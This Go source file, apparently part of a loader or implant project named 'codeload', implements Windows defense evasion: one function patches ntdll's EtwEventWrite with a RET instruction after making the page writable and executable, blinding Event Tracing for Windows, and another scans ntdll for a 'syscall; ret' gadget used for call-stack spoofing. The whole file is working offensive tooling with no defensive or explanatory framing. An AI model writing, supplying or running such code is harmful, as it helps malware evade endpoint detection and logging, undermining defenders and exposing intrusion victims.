//go:build evasion

package evasion

import (
	"codeload/internal/log"
	"syscall"
	"unsafe"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	
	procGetModuleHandleW = kernel32.NewProc("GetModuleHandleW")
	procGetProcAddress   = kernel32.NewProc("GetProcAddress")
	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
)

// Blind patches the EtwEventWrite function in ntdll.dll to prevent ETW telemetry.
func Blind() {
	log.Info("Blinding ETW...")
	// 1. Get ntdll handle
	ntdllStr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	handle, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllStr)))
	if handle == 0 {
		log.Error("Failed to get ntdll handle")
		return
	}

	// 2. Get EtwEventWrite address
	etwStr := []byte("EtwEventWrite\x00")
	addr, _, _ := procGetProcAddress.Call(handle, uintptr(unsafe.Pointer(&etwStr[0])))
	if addr == 0 {
		log.Error("Failed to get EtwEventWrite address")
		return
	}
	log.Debugf("EtwEventWrite at 0x%x", addr)

	// 3. VirtualProtect RWX
	// PAGE_EXECUTE_READWRITE = 0x40
	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(addr, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		log.Error("VirtualProtect RWX failed")
		return
	}

	// 4. Patch with RET (0xC3)
	target := (*byte)(unsafe.Pointer(addr))
	original := *target
	*target = 0xC3
	log.Debugf("Patched 0x%x (Opcode: 0x%x -> 0xC3)", addr, original)

	// 5. Restore protections
	procVirtualProtect.Call(addr, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	log.Success("ETW Blinded")
}

// GetSpoofGadget finds a 'ret' (0xC3) gadget in ntdll.dll.
// For stability, we look for 'syscall; ret' (0x0F 0x05 0xC3) and return the address of 'ret'.
func GetSpoofGadget() uintptr {
	log.Info("Searching for Stack Spoof Gadget...")
	ntdllStr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	handle, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllStr)))
	if handle == 0 {
		log.Error("Failed to get ntdll handle")
		return 0
	}

	// Brute force search in the first 0x200000 bytes of ntdll
	for i := 0; i < 0x200000; i++ {
		ptr := (*[3]byte)(unsafe.Pointer(handle + uintptr(i)))
		// syscall; ret
		if ptr[0] == 0x0F && ptr[1] == 0x05 && ptr[2] == 0xC3 {
			addr := handle + uintptr(i) + 2 // Address of C3
			log.Success("Found Gadget at 0x%x", addr)
			return addr
		}
	}
	log.Error("Gadget not found")
	return 0
}
